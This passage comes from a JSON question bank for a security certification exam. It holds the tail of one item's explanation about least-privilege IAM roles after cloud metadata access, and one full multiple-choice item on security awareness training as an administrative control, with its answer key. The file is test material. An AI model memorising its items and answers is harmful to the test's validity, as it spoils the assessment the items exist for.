  "exp": "Applying least privilege to the IAM role attached to the web server instance would have limited the permissions available even if the metadata service was accessed. If the role only had the minimum permissions needed for the application to function, the attacker would not have obtained broad credentials useful for further exploitation. Full-disk encryption (A) protects data at rest but does not restrict API permissions. A WAF (C) might block the initial exploit but does not address the over-permissioned IAM role. Penetration testing (D) is a detection and assessment activity, not a direct preventive control. In cloud environments, over-permissioned IAM roles are one of the most common and impactful misconfigurations."
 },
 {
  "id": 719,
  "type": "mcq",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A company implements a security policy requiring that all employees complete annual security awareness training, pass a quiz, and acknowledge the acceptable use policy before regaining access to corporate systems. Which mitigation category does this BEST represent?",
  "opts": [
   "A. Technical control — encryption",
   "B. Operational/administrative control — security awareness and training",
   "C. Physical control — access badges",
   "D. Technical control — network segmentation"
  ],
  "correct": 1,
  "exp": "Security awareness training is an operational/administrative control that reduces the human attack surface by educating employees about threats, policies, and best practices. It directly mitigates social engineering attacks (phishing, pretexting, baiting) by teaching users to recognize and report them. Encryption (A) and network segmentation (D) are technical controls. Access badges (C) are physical controls. Administrative controls include policies, procedures, training, background checks, and security governance. Training is particularly effective against social engineering because no technical control can fully prevent a user from voluntarily giving away credentials or clicking a malicious link — the human must be part of the defense."
 }
];
